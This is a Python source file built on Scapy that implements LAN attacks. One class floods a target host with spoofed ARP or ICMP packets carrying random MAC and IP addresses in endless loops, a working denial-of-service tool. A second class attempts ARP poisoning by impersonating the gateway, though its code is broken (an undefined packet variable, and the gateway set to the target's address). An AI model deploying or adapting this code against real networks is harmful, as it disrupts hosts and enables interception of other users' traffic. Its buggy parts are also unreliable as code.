from scapy.all import *
import socket
import os
import sys
import time
from utils.GetIpMac import *
#open a sniffer to detect target arp
class arpfloodlib:
	target_arp=''
	target_ip=''
	host_arp=''
	host_arp=''
	def __init__(self):
		self.host_arp=get_mac_address()
		self.host_ip=get_ip_address('eth0')
	def set_targetarp(self,arp):
		self.target_arp=arp
	def set_targetip(self,ip):
		self.target_ip=ip

	def run_inThree(self):
		packet=Ether(src=RandMAC("*:*:*:*:*:*"),\
			dst=self.target_arp)/\
			IP(dst=self.target_ip,\
			src=RandIP("*.*.*.*"))/\
			ICMP()
		sendp(packet,iface='eth0')

	def run_inTwo(self):
		packet=Ether(src=RandMAC("*:*:*:*:*:*"),dst=self.target_arp)/\
			ARP(psrc=self.target_ip,hwsrc=self.target_arp,\
				pdst=RandIP("*.*.*.*"),hwdst=RandMAC("*:*:*:*:*:*"))
		sendp(packet,iface='eth0')

	def run(self,mode,ip):
		self.set_targetarp(getmacbyip(ip))
		self.set_targetip(ip)
		if int(mode)==0:
			while(True):
				self.run_inTwo()
		if int(mode)==1:
			while(True):
				print "1"
				self.run_inThree()

class arpposion:
	target_arp=''
	target_ip=''
	host_arp=''
	host_arp=''
	gataway_ip=''
	def __init__(self):
		self.host_arp=get_mac_address()
		self.host_ip=get_ip_address('eth0')
	def set_targetarp(self,arp):
		self.target_arp=arp
	def set_targetip(self,ip):
		self.target_ip=ip
	def set_gatawayip(self,ip):
		self.gataway_ip=ip
	def run_in(self):
		packet=Ether()/ARP(pdst=self.target_ip,psrc=self.gataway_ip,op="is-at")
	def run(self,ip,gataway):
		self.set_targetarp(getmacbyip(ip))
		self.set_targetip(ip)
		self.set_gatawayip(ip)
		while(True):
			sendp(packet,iface='eth0')
			time.sleep(0.05)

'''
if __name__=='__main__':
	"""
	ceshi
	"""
	a=arpfloodlib()
	a.run(1,"cc:01:21:50:00:00","192.168.237.66")
	#a=arpposion()
	#a.run("cc:01:21:50:00:00","192.168.237.66","192.168.237.11")
'''





